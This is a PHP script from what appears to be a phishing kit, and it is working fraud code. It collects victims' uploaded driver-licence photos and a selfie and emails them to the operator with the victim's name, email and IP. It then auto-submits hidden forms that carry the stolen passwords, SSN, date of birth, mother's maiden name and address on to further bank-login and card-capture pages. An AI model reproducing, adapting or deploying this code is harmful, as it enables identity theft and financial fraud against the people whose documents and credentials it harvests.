<?php
error_reporting(0);
session_start();
require_once('../get_setting.php');
require_once('../main.php');

if($_SERVER["REQUEST_METHOD"] == "POST"){
    // Check if file was uploaded without errors
    if(isset($_FILES["front"]) && $_FILES["front"]["error"] == 0){
        $allowed = array("jpg" => "image/jpg", "jpeg" => "image/jpeg", "gif" => "image/gif", "png" => "image/png");
        $filename = $_FILES["front"]["name"];
        $filetype = $_FILES["front"]["type"];
        $filesize = $_FILES["front"]["size"];
        $filename1 = $_FILES["back"]["name"];
        $filetype1 = $_FILES["back"]["type"];
        $filesize1 = $_FILES["back"]["size"];

        $filename2 = $_FILES["selfie"]["name"];
        $filetype2 = $_FILES["selfie"]["type"];
        $filesize2 = $_FILES["selfie"]["size"];
    
        // Verify file extension
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        if(!array_key_exists($ext, $allowed)) die("Error: Please select a valid file format.");
    
        // Verify file size - 5MB maximum
        $maxsize = 5 * 1024 * 1024;
        if($filesize > $maxsize) die("Error: File size is larger than the allowed limit.");
    
        // Verify MYME type of the file
        if(in_array($filetype, $allowed)){
            // Check whether file exists before uploading it
            if(file_exists("../pap/" . $filename)){
                echo $filename . " is already exists.";
            } else{
                move_uploaded_file($_FILES["front"]["tmp_name"], "../pap/" . $filename);
                move_uploaded_file($_FILES["back"]["tmp_name"], "../pap/" . $filename1);
                move_uploaded_file($_FILES["selfie"]["tmp_name"], "../pap/" . $filename2);
                $name_of_uploaded_file =basename($_FILES["front"]['name']);
                $name_of_uploaded_file1 =basename($_FILES["back"]['name']);
                $name_of_uploaded_file2 =basename($_FILES["selfie"]['name']);
                $path_of_uploaded_file = "../pap/" . $name_of_uploaded_file;
                $path_of_uploaded_file1 = "../pap/" . $name_of_uploaded_file1;
                $path_of_uploaded_file2 = "../pap/" . $name_of_uploaded_file2;
                $type = $_POST['doc_type'];
                $subjek = "FRONT DRIVER LICENSE [".$_POST['fname']." - ".$_POST['email']."] - [ $cn - $os - $ip ]";
                $subject = "DRIVER LICENSE & Selfie [".$_POST['fname']." - ".$_POST['email']."] - [ $cn - $os - $ip ]";
                $message = '
                <a href="http://'.$_SERVER['SERVER_NAME'].'/pap/'.$name_of_uploaded_file.'" target="_blank"><img width="150" alt="FRONT" src="http://'.$_SERVER['SERVER_NAME'].'/pap/'.$name_of_uploaded_file.'"></a></br></br>
                <a href="http://'.$_SERVER['SERVER_NAME'].'/pap/'.$name_of_uploaded_file1.'" target="_blank"><img width="150" alt="BACK" src="http://'.$_SERVER['SERVER_NAME'].'/pap/'.$name_of_uploaded_file1.'"></a><br>
                <a href="http://'.$_SERVER['SERVER_NAME'].'/pap/'.$name_of_uploaded_file2.'" target="_blank"><img width="150" alt="BACK" src="http://'.$_SERVER['SERVER_NAME'].'/pap/'.$name_of_uploaded_file2.'"></a>
                ';
                include'api.php';
    kirim_foto($email_result, $sender_mail, $subjek, $path_of_uploaded_file);
    tulis_file("../admin/result/total_upload.txt", $ip);
    $subject1 = "BACK DRIVER LICENSE [".$_POST['fname']." - ".$_POST['email']."] - [ $cn - $os - $ip ]";
    kirim_foto($email_result, $sender_mail, $subject1, $path_of_uploaded_file1);
    tulis_file("../admin/result/total_upload.txt", $ip);
    $subject2 = "SELFIE [".$_POST['fname']." - ".$_POST['email']."] - [ $cn - $os - $ip ]";
    kirim_foto($email_result, $sender_mail, $subject2, $path_of_uploaded_file2);
    tulis_file("../admin/result/total_upload.txt", $ip);
    if ($get_bank == "on") {
        echo "<form id='boyxd' method='POST' action='../verifybank'>
        <input type='hidden' name='email' value='".$_POST['email']."'>
        <input type='hidden' name='pass_log' value='".$_POST['pass_log']."'>
        <input type='hidden' name='password' value='".$_POST['password']."'>
        <input type='hidden' name='fname' value='".$_POST['fname']."'>
        <input type='hidden' name='state' value='".$_POST['state']."'>
        <input type='hidden' name='city' value='".$_POST['city']."'>
        <input type='hidden' name='address' value='".$_POST['address']."'>
        <input type='hidden' name='zip' value='".$_POST['zip']."'>
        <input type='hidden' name='dob' value='".$_POST['dob']."'>
        <input type='hidden' name='ssn' value='".$_POST['ssn']."'>
        <input type='hidden' name='phone' value='".$_POST['phone']."'>
        <input type='hidden' name='mmn' value='".$_POST['mmn']."'>
        </form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
    }else{
        if ($get_cc == "on") {
            echo "<form id='boyxd' method='POST' action='../card'>
            <input type='hidden' name='email' value='".$_POST['email']."'>
            <input type='hidden' name='pass_log' value='".$_POST['pass_log']."'>
            <input type='hidden' name='password' value='".$_POST['password']."'>
            <input type='hidden' name='fname' value='".$_POST['fname']."'>
            <input type='hidden' name='state' value='".$_POST['state']."'>
            <input type='hidden' name='city' value='".$_POST['city']."'>
            <input type='hidden' name='address' value='".$_POST['address']."'>
            <input type='hidden' name='zip' value='".$_POST['zip']."'>
            <input type='hidden' name='dob' value='".$_POST['dob']."'>
            <input type='hidden' name='ssn' value='".$_POST['ssn']."'>
            <input type='hidden' name='phone' value='".$_POST['phone']."'>
            <input type='hidden' name='mmn' value='".$_POST['mmn']."'>
            </form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
        }else{
            echo "<form id='boyxd' method='POST' action='../done'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
        }
    }
    } 
        } else{
            echo "Error: There was a problem uploading your file. Please try again."; 
        }
    } else{
        echo "Error: " . $_FILES["front"]["error"];
    }
}else{
    exit(header("HTTP/1.0 404 Not Found"));
}